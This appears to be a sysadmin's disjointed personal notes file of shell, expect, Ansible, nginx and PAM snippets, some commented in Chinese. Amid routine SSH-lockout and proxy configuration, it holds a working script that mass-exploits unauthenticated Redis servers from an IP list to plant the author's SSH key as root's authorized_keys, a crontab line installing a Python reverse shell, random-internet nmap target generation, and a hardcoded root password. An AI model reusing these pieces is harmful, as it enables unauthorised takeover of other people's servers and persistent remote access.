

#!/usr/bin/expect -f
set pass cim2wsx#12Ka$
set server [lrange $argv 0 0]
#set cmds "cat "
spawn scp -P8015 -o StrictHostKeyChecking=no  /home/dh/test/jdk-8u45-linux-x64.tar.gz  root@$server:/root/
match_max 100000
expect "*?assword:*"
send -- "$pass\r"
send -- "\r"
spawn ssh -p8015 -o StrictHostKeyChecking=no root@$server "chmod +x /root/init_jdk.sh && bash /root/init_jdk.sh"
match_max 100000
expect "*?assword:*"
send -- "$pass\r"
send -- "\r"
interact



#!/bin/bash
#set -e 
which expect || aptitude install -y expect
which redis-cli || aptitude install -y redis-server
[[ $# -eq 1 ]] && ip_list=$1

remote_redis(){

   (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
   echo $ip_list
   cat $ip_list | while read ip
   do

    test_login_redis(){
        cat foo.txt | redis-cli -h $ip -x set 1
        redis-cli -h $ip config set dbfilename "authorized_keys"
        redis-cli -h $ip save || redis-cli -h $ip bgsave
        echo $ip >> login_redis.txt
    }
    
    try_login_host(){
            expect -c "
              set timeout 5
              spawn ssh -i ~/.ssh/id_rsa root@$ip echo \"dh\"
              expect {
                \"*yes/no\"     { send \"yes\n\"}

                \"*password\"   { send \"\003\"; exit 1 }
                \"dh\"         { exit 0 }
                timeout         { exit 2 }
              }
              exit 4
            "
            [[ $? == 0 ]] && echo $ip >> login_host.txt
    }

    expect -c "
      set timeout 3
      spawn redis-cli -h $ip config set dir /root/.ssh/
      expect {
	          \"OK\"     { exit 0 }
      "
expect -c "spawn ls /tmp ; interact"



    case $? in
        0)  test_login_redis && try_login_host
        ;;
        *)  continue
        ;;
    esac
  done
  test -f login_redis.txt && wc -l login_redis.txt
  test -f login_host.txt && wc -l login_host.txt
}

test -f ~/.ssh/id_rsa || ssh-keygen  -t rsa -f ~/.ssh/id_rsa  -P ''






    expect -c "
      set timeout 3
      spawn redis-cli -h 180.42.164.10 config set dir /root/.ssh/
    "


      expect -c "
      set timeout 3
      spawn ls /tmp
    "


    　#!/usr/bin/expect
　　set timeout 30
　　spawn ssh -l username 192.168.1.1
　　expect "password:"
　　send "ispass\r"
　　interact

expect -c ‘spawn ssh user@host ; expect assword ; send “password\n” ; expect “>” ; send “commands\n reboot\n” ; interact’

expect -c "spawn ls /tmp ; interact"



echo "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/crontab



nmap -iR 10000 -sL -n | grep "not scanned" | awk '{print $2}' | sort -n | uniq >! tp; head 1000 tp >! tcp-allports-1M-IPs; rm tp


nmap -iR 1000 -sL -n | grep "not scanned" | awk '{print $2}' | sort -n | uniq > tp


 ansible  -i /etc/ansible/hosts v8687 -m lineinfile -a "dest=/etc/sudoers state=absent regexp='^%admgroup' "

- lineinfile: dest=/etc/httpd/conf/httpd.conf regexp="^Listen " insertafter="^#Listen " line="Listen 8080"

- lineinfile: dest=/etc/services regexp="^# port for http" insertbefore="^www.*80/tcp" line="# port for http by default"

 ansible -i ansible_hosts_online all -m lineinfile -a'dest=/etc/pam.d/sshd regexp="^#%PAM-1.0" insertafter="#%PAM-1.0" line="auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200"' -udinghao -s


ansible ceshi -m lineinfile -a'dest=/etc/pam.d/sshd state=absent regexp="^#%PAM-1.0" insertafter="auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200"' -udinghao -s

    - name: httpd.conf modify 8080
      lineinfile:
         dest: /opt/playbook/test/http.conf
         regexp: '^Listen'
         insertbefore: '^#Port'   
         line: 'Listen 8080'
      tags:
       - http8080


dh@dh-pc:~$ cat lineinfile4.yml 
---
- hosts: ceshi
  user: dinghao
  sudo: yes
  gather_facts: flase
  tasks:
    - name: pam_sshd
      lineinfile: state=present 
          dest=/etc/pam.d/sshd
          regexp='^#%PAM-1.0'
          insertafter='auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200'



 ansible -i ansible_hosts_online all -m shell -a"sed  -i '/^#%PAM-1.0/a\auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200'  /etc/pam.d/sshd" -udinghao -s


sed  -i '/^#%PAM-1.0/a\auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200'  /etc/pam.d/sshd

 ansible ceshi all -m lineinfile -a'dest=/etc/pam.d/sshd regexp="^#%PAM-1.0" insertafter="#%PAM-1.0" line="auth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200"' -udinghao -s

ansible -i /etc/ansible/hosts  ceshi -m shell -a" sed -i '/^#%PAM-1.0/uth       required     pam_tally2.so  deny=3  unlock_time=600 even_deny_root root_unlock_time=1200'  /etc/pam.d/sshd" -udinghao -s

sed -i 'N;1i/#%PAM-1.0' /etc/pam.d/sshd

sed -i 's\unlock_time\i/#%PAM-1.0' /etc/pam.d/sshd

path_scripts=/data/scripts
path_logs=/data0/logs
echo $@
[ -n $1 -a  -n $2 -a -n $3 -a  -n $4 ] || { echo "Please Check args contain_name,port,project of name,test or qa" && exit 0 ; }

test -d ${path_scripts} || mkdir -pv ${path_scripts}
test -d ${path_logs} || mkdir -pv ${path_logs}

docker run --restart=always --name $1 -p$2:$2  -v ${path_scripts}:${path_scripts} -v ${path_logs}:${path_logs} -d 192.168.1.51:5000/javalang java -jar /data/scripts/$3/$3-$4.jar --spring.profiles.active=$4 


docker run --restart=always --name dev_oryx -p 8300:8300 -p 1883:1883 -v /data/scripts:/data/scripts -v /data0/logs:/data0/logs -d 192.168.1.51:5000/javalang java -jar /data/scripts/oryx/oryx-test.jar --spring.profiles.active=test


prohibit-password



PermitRootLogin yes
#PermitRootLogin yes

sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config || sed -i 's/^#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config



[root@vv30-cimhealth pam.d]# cat sshd 
#%PAM-1.0
auth       required    pam_tally2.so    deny=3    unlock_time=600 even_deny_root root_unlock_time=1200

在第一行下即#%PAM-1.0的下面添加:
auth    required    pam_tally2.so    deny=3    unlock_time=600 even_deny_root root_unlock_time=1200

各参数解释:
even_deny_root    也限制root用户； 
     
deny           设置普通用户和root用户连续错误登陆的最大次数，超过最大次数，则锁定该用户 
     
unlock_time        设定普通用户锁定后，多少时间后解锁，单位是秒； 
     
root_unlock_time      设定root用户锁定后，多少时间后解锁，单位是秒； 


手动解除锁定：
查看某一用户错误登陆次数：
pam_tally --user
例如，查看work用户的错误登陆次数：
pam_tally --user work
清空某一用户错误登陆次数：
pam_tally --user --reset
例如，清空 work 用户的错误登陆次数，
pam_tally --user work --reset 
faillog -r 命令亦可。

如果前几条没生效的话，也可以使用命令：

pam_tally2 –u tom --reset将用户的计数器重置清零（SLES 11.2下用此命令才重置成功）

查看错误登录次数：pam_tally2 –u tom 

[root@vv30-cimhealth pam.d]# pam_tally2 --user d1
Login           Failures Latest failure     From
d1                  6    03/28/17 18:54:08  192.168.3.222
[root@vv30-cimhealth pam.d]# pam_tally2 --user d2
Login           Failures Latest failure     From
d2                  6    03/28/17 18:55:14  192.168.3.222
[root@vv30-cimhealth pam.d]# pam_tally2 --user d2 --reset
Login           Failures Latest failure     From
d2                  6    03/28/17 18:55:14  192.168.3.222






server { 
	listen 80 ; 
	server_name oryx.dev.cimhealth.com; 
		location / { 
		proxy_redirect off; 
		proxy_set_header Host $host; 
		proxy_set_header X-Forwarded-For $remote_addr; 
		proxy_set_header X-Forwarded-Host $server_name; 
		proxy_set_header X-Real-IP $remote_addr; 
		proxy_pass http://192.168.1.73:80;
		} 
}

server { 
	listen 1883; 
	server_name oryx.dev.cimhealth.com; 
		location / { 
		proxy_redirect off; 
		proxy_set_header Host $host; 
		proxy_set_header X-Forwarded-For $remote_addr; 
		proxy_set_header X-Forwarded-Host $server_name; 
		proxy_set_header X-Real-IP $remote_addr; 
		proxy_pass http://192.168.1.73:80;
		} 
}


$ mv nginx.conf{,.bak}
$ vim  /etc/nginx/nginx.conf
worker_processes auto;
events {
    worker_connections  1024;
}
error_log /var/log/nginx_error.log info;
stream {
    upstream mysqld {
        hash $remote_addr consistent;
        server 192.168.1.42:3306 weight=5 max_fails=1 fail_timeout=10s;
        server 192.168.1.43:3306 weight=5 max_fails=1 fail_timeout=10s;
    }
    server {
        listen 3306;
        proxy_connect_timeout 1s;
        proxy_timeout 3s;
        proxy_pass mysqld;
    }
}



server { 
	listen 80 ; 
	server_name oryx.dev.cimhealth.com; 
		location / { 
		proxy_redirect off; 
		proxy_set_header Host $host; 
		proxy_set_header X-Forwarded-For $remote_addr; 
		proxy_set_header X-Forwarded-Host $server_name; 
		proxy_set_header X-Real-IP $remote_addr; 
		proxy_pass http://192.168.1.73:80;
		} 
}
stream {
    upstream dev1883 {
        hash $remote_addr consistent;
        server 192.168.1.86:1883 weight=5 ;
        }
    server {
        listen 3306;
        server_name oryx.dev.cimhealth.com ;
        proxy_connect_timeout 1s;
        proxy_timeout 3s;
        proxy_pass dev1883;
    }
}



--with-http_spdy_module 在nginx-1.9.5+ now moved to http2 module.被替换成　--with-http_v2_module　模块

centos7 在编译pam 走的坑
pam_conv_l.c:871: undefined reference to `yywrap'
[root@vv30-cimhealth Linux-PAM-1.1.8]# rpm -q flex
flex-2.5.37-3.el7.x86_64
这个是仍然编译不过去
yum search flex
flex-devel.i686 : Libraries for flex scanner generator
flex-devel.x86_64 : Libraries for flex scanner generator
flex-doc.x86_64 : Documentation for flex scanner generator
全部安装后才好，貌似依赖686的包
yum install flex flex-devel  flex-devel.i686 flex-doc -y 



/bin/bash -x /home/www/runtest2.sh